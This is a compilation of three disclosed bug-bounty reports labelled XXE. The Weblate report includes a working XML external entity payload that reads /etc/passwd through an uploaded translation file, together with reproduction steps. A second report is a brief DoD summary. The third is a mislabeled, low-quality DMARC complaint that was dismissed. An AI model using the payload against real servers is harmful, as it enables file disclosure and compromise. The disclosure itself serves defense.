### [Uploaded XLF files result in External Entity Execution](https://hackerone.com/reports/232614)

- **Report ID:** `232614`
- **Severity:** High
- **Weakness:** XML External Entities (XXE)
- **Program:** Weblate
- **Reporter:** @4cad
- **Bounty:** - usd
- **Disclosed:** 2017-06-02T11:24:15.907Z
- **CVE(s):** -

**Vulnerability Information:**

Summary:
========
 Weblate users in the Translate group (or those with the ability to upload translation files) can trigger XML External Entity Execution. This is a well known and high/critical vector of attack that often can completely compromise the security of a web application or in some cases lead to Remote Code Execution (although I do not expect it to be an easy RCE in this case).

Description:
========
The XML External Entity Execution allows for arbitrary reading of files on the server using a relatively obscure aspect of the XML language. It is generally considered high or critical severity, most notably Google places it at the same severity as remote code execution because of the potential for Server-Side Request Forgery, Remote Code Exection, and arbitrary File Read.

The mitigating factors here for you are that some account priveleges are required to upload tranlation files, although by default this gets rolled into the @Translate group. Also because your web server is python based it is not vulnerable to the trivial RCE that PHP servers are commonly vulnerable to.

The core of the vulnerability is in how the translate-toolkit processes .XLF files. The XLIFF standard is XML based, and thus supports by default standard XML functionality including external entity execution.

In my proof of concept, I dowloaded as .XLF the translations of the "hello" project which is being pointed to by my local Weblate instance. A minor modification shown in the steps below results in the /etc/passwd file out through the UI for review as a translation, although much worse things can be done - this is just to prove the vulnerability exists. For more details search for "XML External Entity Exploit"

See the attached screenshots and exploit XML file for evidence of the vulnerability.

Version:
========

I tested this against the latest stable source available a couple fo days ago (~May 26) running "Weblate 2.15-dev"

Steps to Reproduce
========
(I have included a live exploit testproject-testcomponent-en_GB.xlf that works with the "hello" data backing the demo website.)

* Log in as a user that has permission to upload translation files.
* Go to a component, and download its translations as XLF
* Add the following two lines after the "<?xml" tag, and replace one of the translation texts with "&xxe;" :

```
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
```
* Upload the file back to the server
* Observe the contents of the passwd file as a translation

---

### [XXE on DoD web server](https://hackerone.com/reports/188743)

- **Report ID:** `188743`
- **Severity:** Critical
- **Weakness:** XML External Entities (XXE)
- **Program:** U.S. Dept Of Defense
- **Reporter:** @dawgyg
- **Bounty:** - usd
- **Disclosed:** 2017-01-09T16:12:25.176Z
- **CVE(s):** -

**Summary (team):**

A Department of Defense webserver was vulnerable to an XML External Entity (XXE) processing vulnerability. dawgyg was able to exploit this vulnerability by crafting an XML request that revealed sensitive local system information. Thanks dawgyg!

---

### [DMARC  Not found for paragonie.com   URGENT](https://hackerone.com/reports/179828)

- **Report ID:** `179828`
- **Severity:** Critical
- **Weakness:** XML External Entities (XXE)
- **Program:** Paragon Initiative Enterprises
- **Reporter:** @not_hackerone_hero
- **Bounty:** - usd
- **Disclosed:** 2016-11-03T05:30:49.574Z
- **CVE(s):** -

**Vulnerability Information:**

#Hi sir, ,

I am  new hacker in hackerone platform  I am glad to join paragonie bounty program  ..i  want to report a very critical bug that is i found DMARC   missing for your domain paragonie.com

Add DMARC record as soon as  possible ..


DMARC description 

Background

Email authentication technologies SPF and DKIM were developed over a decade ago in order to provide greater assurance on the identity of the sender of a message. Adoption of these technologies has steadily increased but the problem of fraudulent and deceptive emails has not abated. It would seem that if senders used these technologies, then email receivers would easily be able to differentiate the fraudulent messages from the ones that properly authenticated to the domain. Unfortunately, it has not worked out that way for a number of reasons.

Many senders have a complex email environment with many systems sending email, often including 3rd party service providers. Ensuring that every message can be authenticated using SPF or DKIM is a complex task, particularly given that these environments are in a perpetual state of flux.
If a domain owner sends a mix of messages, some of which can be authenticated and others that can’t, then email receivers are forced to discern between the legitimate messages that don’t authenticate and the fraudulent messages that also don’t authenticate. By nature, spam algorithms are error prone and need to constantly evolve to respond to the changing tactics of spammers. The result is that some fraudulent messages will inevitably make their way to the end user’s inbox.
Senders get very poor feedback on their mail authentication deployments. Unless messages bounce back to the sender, there is no way to determine how many legitimate messages are being sent that can’t be authenticated or even the scope of the fraudulent emails that are spoofing the sender’s domain. This makes troubleshooting mail authentication issues very hard, particularly in complex mail environments.
Even if a sender has buttoned down their mail authentication infrastructure and all of their legitimate messages can be authenticated, email receivers are wary to reject unauthenticated messages because they cannot be sure that there is not some stream of legitimate messages that are going unsigned.
The only way these problems can be addressed is when senders and receivers share information with each other. Receivers supply senders with information about their mail authentication infrastructure while senders tell receivers what to do when a message is received that does not authenticate.

{F132000}

In 2007, PayPal pioneered this approach and worked out a system with Yahoo! Mail and later Gmail to collaborate in this fashion. The results were extremely effective, leading to a significant decrease in suspected fraudulent email purported to be from PayPal being accepted by these receivers.

The goal of DMARC is to build on this system of senders and receivers collaborating to improve mail authentication practices of senders and enable receivers to reject unauthenticated messages.

DMARC and the Email Authentication Process


{F131994}

DMARC is designed to fit into an organization’s existing inbound email authentication process. The way it works is to help email receivers determine if the purported message “aligns” with what the receiver knows about the sender. If not, DMARC includes guidance on how to handle the “non-aligned” messages. For example, assuming that a receiver deploys SPF and DKIM, plus its own spam filters, the flow may look something like this:

DMARC authentication flowIn the above example, testing for alignment according to DMARC is applied at the same point where ADSP would be applied in the flow. All other tests remain unaffected.

At a high level, DMARC is designed to satisfy the following requirements:

Minimize false positives.
Provide robust authentication reporting.
Assert sender policy at receivers.
Reduce successful phishing delivery.
Work at Internet scale.
Minimize complexity.
It is important to note that DMARC builds upon both the DomainKeys Identified Mail (DKIM) and Sender Policy Framework (SPF) specifications that are currently being developed within the IETF. DMARC is designed to replace ADSP by adding support for:

{F131999}


wildcarding or subdomain policies,
non-existent subdomains,
slow rollout (e.g. percent experiments)
SPF
quarantining mail
Anatomy of a DMARC resource record in the DNS

DMARC policies are published in the DNS as text (TXT) resource records (RR) and announce what an email receiver should do with non-aligned mail it receives.

{F131994}

Consider an example DMARC TXT RR for the domain “sender.dmarcdomain.com” that reads:

"v=DMARC1;p=reject;pct=100;rua=mailto:postmaster@dmarcdomain.com"
In this example, the sender requests that the receiver outright reject all non-aligned messages and send a report, in a specified aggregate format, about the rejections to a specified address. If the sender was testing its configuration, it could replace “reject” with “quarantine” which would tell the receiver they shouldn’t necessarily reject the message, but consider quarantining it.
DMARC records follow the extensible “tag-value” syntax for DNS-based key records defined in DKIM. The following chart illustrates some of the available tags:



How Senders Deploy DMARC in 5-Easy Steps

DMARC has been designed based on real-world experience by some of the world’s largest email senders and receivers deploying SPF and DKIM. The specification takes into account the fact that it is nearly impossible for an organization to flip a switch to production. There are a number of built-in methods for “throttling” the DMARC processing so that all parties can ease into full deployment over time.

Deploy DKIM & SPF. You have to cover the basics, first.
Ensure that your mailers are correctly aligning the appropriate identifiers.
Publish a DMARC record with the “none” flag set for the policies, which requests data reports.
Analyze the data and modify your mail streams as appropriate.
Modify your DMARC policy flags from “none” to “quarantine” to “reject” as you gain experience.

{F131998}




Spammers can sometimes forge the "From" address on email messages so the spam appears to come from a user in your domain. To help prevent this sort of abuse, Google is participating in DMARC.org, which gives domain owners more control over what Gmail does with spam email messages from their domain.

G Suite follows the DMARC.org standard and allows you to decide how Gmail treats unauthenticated emails coming from your domain. Domain owners can publish a policy telling Gmail and other participating email providers how to handle unauthenticated messages sent from their domain. By defining a policy, you can help 
combat phishing to protect users and your reputation.






Prerequisites
You must send all email messages through your own domain for DMARC to be effective. Messages sent on your behalf through third-party providers will appear unauthenticated and therefore can be rejected, depending upon your policy disposition. To authenticate messages sent from third-party providers, either share your DKIM key with them for inclusion on messages or have them relay messages through your network.

If you're a domain owner, you'll first need to configure SPF records and DKIM keys on all outbound email streams. DMARC relies upon these technologies to ensure signature integrity. A message that fails SPF and/or DKIM checks will trigger the DMARC policy. A single check failure using either technology allows the message to pass DMARC. See the corresponding SPF and DKIM sections of the DMARC specification for example messages filtered by these tools.

{F131997}

Considerations
Here are some things to keep in mind:

You'll receive a daily report from each participating email provider so you can see how often your messages are authenticated, how often invalid messages are identified, and policy actions requested and taken by IP address.
You can adjust your policy as you learn from the data in these reports. For example, you can adjust your actionable policies from “monitor” to “quarantine” to “reject” as you become more confident that your own messages will all be authenticated.
Your policy can be strict or relaxed. For example, eBay and PayPal publish a policy requiring all of their messages to be authenticated in order to appear in someone's inbox. In accordance with their policy, Google rejects all messages from eBay or PayPal that aren’t authenticated.
Recipients don't have to do anything, because Google is conducting the DMARC check for you.
See the DMARC Overview for other considerations. See these related articles for additional details:

{F131995}

#I am thankful to hackerone platform

##I want yout to fix this as soon as possible !!

Thanks.
Hackerone_hero

**Summary (team):**

We're not sure why this one is so popular. Our policies clearly state **We Practice Full Disclosure.**

**Summary (researcher):**

##I am not satisfied with the  decision taken for this report  
##How can they close my report without giving any reason ?

---
